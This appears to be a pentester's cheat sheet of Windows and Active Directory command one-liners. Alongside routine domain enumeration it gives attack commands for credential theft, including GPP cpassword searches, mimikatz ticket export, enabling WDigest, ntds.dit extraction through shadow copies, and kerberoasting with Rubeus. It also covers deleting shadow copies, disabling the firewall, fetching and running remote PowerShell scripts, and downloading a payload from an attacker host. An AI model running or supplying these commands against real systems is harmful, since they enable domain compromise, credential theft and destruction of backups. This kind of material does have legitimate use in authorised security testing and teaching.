* Discovery running ms sql servers in windows active directory domain environment without nmap or any scan tool. 
-> setspn -T abc.local -Q */* | findstr ":1433" > mssql.txt

* Finding cpassword files and exploit group policy preferences 
-> findstr /S cpassword %logonserver%\sysvol\*.xml
-> findstr /S cpassword $env:logonserver\sysvol\*.xml

* List all domain controllers
-> nltest /dclist:targetdomain.local

* Discover local users
-> net localgroup administrators /domain

* find krbtgt user last password set, created date and status
-> Get-AdUser krbtgt -property created, passwordlastset, enabled
-> Get-ADUser krbtgt -Property PasswordLastSet

* user agent string manipulation specially powershell invoke or downloader requests, you can use different user agent string
-> $userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
  
*  Get SID of a local user
-> wmic useraccount where name='ahmethan' get sid

* Get SID for current logged in domain user
-> wmic useraccount where name='%username%' get sid

* Get SID for current logged in domain user
-> whoami /user

* Get SID of krbtgt user 
-> wmic useraccount where name='krbtgt' get sid

* Delete shadow copy
-> vssadmin delete shadows /all /quiet
-> wmic shadowcopy delete

* List domain admin users 
-> net group "Domain Admins" /domain

* exporting all kerberos tickets using mimiktaz
-> kerberos::list /export

* Enable Wdigest on newer versions of Windows for mimikatz dump feature with using registry key
-> reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1

* Invoke-Bloodhound and find shortest path for becoming domain admin
-> powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

* to test the connection between other machines which using powershell command change valid ip adres
-> Test-NetConnection 10.10.10.10 -CommonTCPPort rdp

* discover potencial http services with using setspn 
-> setspn -T abc.local -Q */* | findstr "HTTP" 

* enable remote desktop services with using basic command
-> Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true

* stop windows update service
-> sc stop wuauserv

* list all scheduled task easy way
- > schtasks /query /xml > totaltasklist.txt

* basic recon using powershell command
-> Get-ADGroupMember -Server dcservername "Domain Admins"  | select samaccountname,sid

* To disable all proxy variables in one line for your current session specially linux environments.
-> unset `env | grep proxy | cut -d= -f1`

* Check powershell Language mode 
-> $ExecutionContext.SessionState.LanguageMode

* Export GPO Settings with PowerShell
-> Get-GPO -All | % {$_.GenerateReport('html') | Out-File "$($_.DisplayName).htm"}

* Simple way to temporarily bypass PowerShell execution policy
-> set-executionpolicy bypass 

* How to find user accounts with Kerberos preauthentication disabled.
-> get-aduser  -LDAP "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" -properties DoesNotRequirePreAuth
-> get-aduser -filter * -properties DoesNotRequirePreAuth |where {$_.DoesNotRequirePreAuth -eq "TRUE"}

* Default domain password policy check
-> Net accounts /domain

* How to dump the Windows SAM file while the system is running?
-> esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit

* Find active directory trust information with using powershell command
-> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

* Find active directory domain information with using powershell command
-> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

* Find active directory domain trust
-> ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

* Get forest global catolog
-> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs

* Identify admin accounts
-> get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf

* Create remote shadow copy with wmi for ntds.dit password extraction
-> wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
-> wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"

* request kerberos tickets
-> Add-Type -AssemblyName System.IdentityModel
-> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"

* rubeus kerberoast
-> .\.rubeus.exe kerberoast /creduser:domain\user /credpassword:password

* list running process
-> tasklist /SVC

* find domain name and sid information
-> whoami /user

* discover elevated credentials in C: drive
-> C:\> dir /b /s unattend.xml
-> C:\> dir /b /s web.config
-> C:\> dir /b /s sysprep.inf
-> C:\> dir /b /s sysprep.xml
-> C:\> dir /b /s *pass*
-> C:\> dir /b /s vnc.ini

* To test trusted domains
-> nltest /trusted_domains

* test secure channel between DC in domain 1 and Trusted domain
-> nltest /server:dc1  /sc_query:trusted domain

* find active opened session on machine
-> query user /server:$SERVER

* list all domain users
-> net users /domain

* List all domain groups
-> net groups /domain

* list domain admin users
-> net groups "domain admins" /domain

* list all enterprise admin users
-> net groups "Enterprise Admins" /domain

* connect remote computer and run remote commands with using psexec
-> psexec \\192.168.86.62 cmd

* run remote commands with using wmic
-> wmic /node:[TargetIPaddr] /user:[User] /password:[Passwd] process list full

* turn off built-in windows firewall
-> netsh firewall set opmode disable

* show all tcp and udp port usage and process ID
-> netstat -ano

* find remote machine running process with using wmic
-> wmic /node:computername process where (name = "cmd.exe") get processid,name

* save all running scheduled tasks
-> Schtasks /query /fo csv > scheduled_tasks.csv

* Displays information about the specified service, driver, type of service, or type of driver
-> sc query 

* Allow ps1 files without blocking powershell v3 later
-> ls -r *.ps1 | Unblock-File

* ensure and check your powershell execution policy with cmdlet
-> Set-ExecutionPolicy AllSigned | RemoteSigned | Unrestricted

* wmic open file and urşl download payload  
-> wmic process call create "C:\Program Files\Internet Explorer\iexplore.exe www.attackerserver.com"
-> wmic process call create "C:\Program Files\Internet Explorer\iexplore.exe http://1.1.1.1/payload.exe"

* Enable RDP with wmic command
-> wmic /node:"computername" path Win32_TerminalServiceSetting where AllowTSConnections=“0” call SetAllowTSConnections “1”

* List user accounts
-> wmic useraccount
-> wmic useraccount list brief

*  Displays the initial Kerberos TGT.
-> klist tgt

*  Displays a list of logon sessions on this computer.
-> klist sessions

* If no parameters are provided, Klist will retrieve all the tickets for the currently logged on user.
-> klist

* wmic find quest account sid and name
-> wmic useraccount where (name='guest' and domain='abc.local') get name,sid

* running cmd with psexec
-> PsExec.exe -s -i -d cmd.exe

* check password rotation and maxpasswordage with reg query 
-> reg query HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters

* check privileges current user 
-> whoami /priv

* runas cmd another user profile
->runas /profile /env /user:mydomain\user cmd

* Search for keyword “password” in registry:
-> REG QUERY HKLM /F "password" /t REG_SZ /S /K
-> REG QUERY HKCU /F "password" /t REG_SZ /S /K

* Look for passwords logged for autologon
->reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>null | findstr "DefaultUserName DefaultDomainName DefaultPassword"

* enable telnet with command line
->dism /online /Enable-Feature /FeatureName:TelnetClient

* find domain controllers,ou,servers,trust...many more with single command
-> netdom query dc
-> netdom query fmso
-> netdom query ou
-> netdom query trust
-> netdom query /domain domain.local DC
-> netdom query /domain domain.local TRUST
-> netdom query /domain domain.local FSMO 
-> netdom query /domain domain.local OU

* Verify domain controllers in a domain
->nltest /dclist:domain.local

* Advanced information about user
-> nltest /user:"testuser"

* Show trust relationships for a domain
-> nltest /domain_trusts

* Configure the remote machine to work with WinRM. We need to run the below command from elevated powershell prompt
-> Enable-PSRemoting -Force

* Testing the WinRM Connection
* We can use the Test-WSMan function to check if target is configured for WinRM. It should return information returned about the protocol version and wsmid
-> Test-WSMan XXXX-server01.example.com

* Add Winrm Trusted Host in Windows
-> winrm set winrm/config/client @{TrustedHosts="RemoteComputerName"}


